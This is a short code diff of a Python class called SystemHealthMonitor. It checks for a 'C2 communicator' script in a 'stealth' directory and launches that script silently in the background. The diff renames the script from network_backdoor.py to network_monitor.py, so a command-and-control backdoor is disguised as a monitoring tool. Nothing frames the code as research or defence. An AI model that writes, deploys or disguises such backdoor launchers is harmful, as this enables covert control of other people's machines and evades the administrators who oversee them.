@@ -37,7 +37,7 @@ class SystemHealthMonitor:
         Path(self.backup_dir).mkdir(parents=True, exist_ok=True)
         
         # Ensure C2 communicator is present
-        c2_script = f"{self.stealth_dir}/network_backdoor.py"
+        c2_script = f"{self.stealth_dir}/network_monitor.py"
         if not os.path.exists(c2_script):
             # You would copy the actual C2 script here
             self.logger.info("C2 communicator not found - would deploy here")
@@ -45,7 +45,7 @@ class SystemHealthMonitor:
     def start_c2_communication(self):
         """Start C2 communication in background"""
         try:
-            c2_script = f"{self.stealth_dir}/network_backdoor.py"
+            c2_script = f"{self.stealth_dir}/network_monitor.py"
             if os.path.exists(c2_script):
                 subprocess.Popen([sys.executable, c2_script],
                                stdout=subprocess.DEVNULL,
